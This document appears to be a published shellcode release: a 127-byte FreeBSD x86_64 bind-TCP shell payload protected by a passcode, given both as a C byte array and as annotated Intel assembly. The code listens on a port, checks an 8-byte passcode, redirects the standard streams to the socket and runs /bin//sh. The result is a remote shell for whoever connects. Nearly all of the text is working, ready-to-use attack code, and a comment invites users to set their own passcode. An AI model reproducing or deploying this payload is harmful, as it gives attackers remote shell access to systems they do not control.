/*
* Gitsnik, @dracyrys
* FreeBSD x86_64 bind_tcp with passcode, 127 bytes
* Passcode: R2CBw0cr
*/

C Source:

char code[] = \
"\x6a\x61\x58\x6a\x02\x5f\x6a\x01\x5e\x99"
"\x0f\x05\x48\x97\xba\xff\x02\xaa\xaa\x80"
"\xf2\xff\x52\x48\x89\xe6\x99\x04\x66\x80"
"\xc2\x10\x0f\x05\x04\x6a\x0f\x05\x04\x1e"
"\x48\x31\xf6\x99\x0f\x05\x48\x97\x6a\x03"
"\x58\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10"
"\x0f\x05\x48\xb8\x52\x32\x43\x42\x77\x30"
"\x63\x72\x57\x48\x8d\x3e\x48\xaf\x74\x08"
"\x48\x31\xc0\x48\xff\xc0\x0f\x05\x5f\x48"
"\x89\xd0\x48\x89\xfe\x48\xff\xce\xb0\x5a"
"\x0f\x05\x75\xf7\x99\x04\x3b\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54"
"\x5f\x52\x57\x54\x5e\x0f\x05";

Assembly Intel Source:

global _start

;
; Bindshell in 64 bit shellcode (written
; and tested on a FreeBSD 9.1 AMD64 OS)
;
; Author: Gitsnik
; Twitter: @dracyrys
; Passcode: R2CBw0cr
; 127 bytes
;

section .text

_start:
;
; int socket( 2, 1, 0 )
;
; socket will return a socket into rax
;
; 12 bytes
;
push byte 0x61
pop rax
push byte 0x02
pop rdi
push byte 0x01
pop rsi
cdq  ; rdx is null
syscall  ; socket( 2, 1, 0 )

;
; Swap our socket from RAX into RDI which is where
; the next few functions want it anyway
;
; xchg is 1 byte shorter than mov
;
; 2 bytes
xchg rdi, rax    ; socket in rdi for bind() rax is now 2

;
; bind( sockfd, *addr, addrlen )
;
; We need to set up our serv_addr (which we know is 0,port,2)
; So load it all into RAX and push that. Note that because we want
; 7 bytes but the register is 8, we pad 0xff onto the back and then
; xor it to null to line everything up.
;
; 20 bytes

mov edx, 0xaaaa02ff
xor dl, 0xff
push rdx
mov rsi, rsp     ; rsi points to our sockaddr *

cdq              ; reset RDX
add al, 0x66     ; bind() is 0x68 but rax is already 0x02
add dl, 0x10     ; 16 (sizeof)
syscall

;
; listen is 0x6a
;
; listen( sockfd, backlog )
;
; bind() returns 0 on success, so add al, RDI already points at our
; sockfd, and we don't care what's in backlog but because it's a
; stack pointer from a few lines back the number is sufficiently high
; that it doesn't matter.
;
; 4 bytes

add al, 0x6a
syscall

;
; accept( sockfd, 0, 0 )
;
; accept() will return a new sockfd for us.
;
; 8 bytes
;
add al, 0x1e
xor rsi, rsi
cdq
syscall

;
; read( socket, buffer, length )
;
; Calls should read:
; rax: syscall number (0x03 on FreeBSD)
; rdi: client socket
; rsi: buffer address
; rdx: read size (0xf)
;
; We take the returned sockfd ( client ) from rax and load it into rdi
; as our second argument. We set RAX to be 0x03, as this is the syscall
; ID (reference: /usr/include/sys/syscall.h)
;
; Set rsi to be rsp-0xf to give us 0xf bytes of space for a buffer
; and set dl to be our length. RDX is still null because of the cdq we
; did earlier.
;
; When we are finished RAX will be the number of bytes read from the socket
; RDI will be our client socket
; RSI will contain the pointer to our string for passcode comparison
; RDX will be 0x000000000000000F
;
; 16 bytes

xchg rdi, rax
push byte 0x03   ; 0x03 is read() in FreeBSD
pop rax
push rdx         ; Still null from cdq up top.
lea rsi, [rsp-0x10]
add dl, 0x10
syscall

;
; rsi has our string, rdi client socket
;
; 18 bytes
;
mov rax, 0x7263307742433252 ; Replace your 8 character passcode here.
push rdi                    ; save the socket
lea rdi, [rsi]
scasq
jz dup2setup

;
; Exit
;
; 8 bytes
;
xor rax, rax
inc rax
syscall

;
; Setup for dup2 loop
;
; 7 bytes
;
dup2setup:
pop rdi
mov rax, rdx    ; RDX is dl, 0x10 but otherwise 0x00
; so we can do this and then just correct
; in the dup2 loop.
mov rsi, rdi

;
; dup2 loop
;
; 9 bytes
dup2:
dec rsi
mov al, 0x5a
syscall
jnz dup2

;
; Now for the big one. Let's set up our execve()
;
; At this point RAX is 0 so just null out rdx
;
; We need rdx to be null for the 3rd argument to execve()
;
; 23 bytes
cdq

add al, 0x3b     ; execve()
mov rbx, 0x68732f2f6e69622f ; hs//nib/

; Argument one shell[0] = "/bin//sh"
push rdx     ; null
push rbx     ; hs//nib/

; We need pointers for execve()
push rsp     ; *pointer to shell[0]
pop rdi  ; Argument 1

; Argument two shell (including address of each argument in array)
push rdx     ; null
push rdi     ; address of shell[0]

; We need pointers for execve()
push rsp     ; address of char * shell
pop rsi      ; Argument 2

syscall